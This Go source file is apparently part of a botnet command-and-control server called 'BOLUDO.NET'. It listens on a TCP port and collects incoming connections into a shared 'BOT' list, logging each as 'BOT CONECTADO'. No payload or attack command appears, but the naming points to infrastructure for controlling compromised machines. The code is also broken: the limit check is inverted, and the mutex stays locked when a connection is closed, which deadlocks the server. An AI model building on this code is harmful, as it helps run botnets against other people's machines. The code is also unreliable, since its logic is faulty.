package net

import (
	"log"
	"net"

	"BOLUDO.NET/config"
)

func Start() {

	// Iniciar servidor
	Listener, err := net.Listen("tcp", ":"+config.PORT)
	if err != nil {
		log.Fatalf(" [!] Error: %s", err.Error())
	}
	// Aceptar Conecciones
	for {
		conn, err := Listener.Accept()
		if err != nil {
			log.Fatalf(" [!] Error: %s", err.Error())
		} else {
			config.Mutex.Lock()
			if len(config.BOT) <= config.BOT_LIMIT {
				conn.Close()
			} else {
				config.BOT = append(config.BOT, conn)
				config.Mutex.Unlock()
				log.Println("BOT CONECTADO")
			}

		}
	}
}
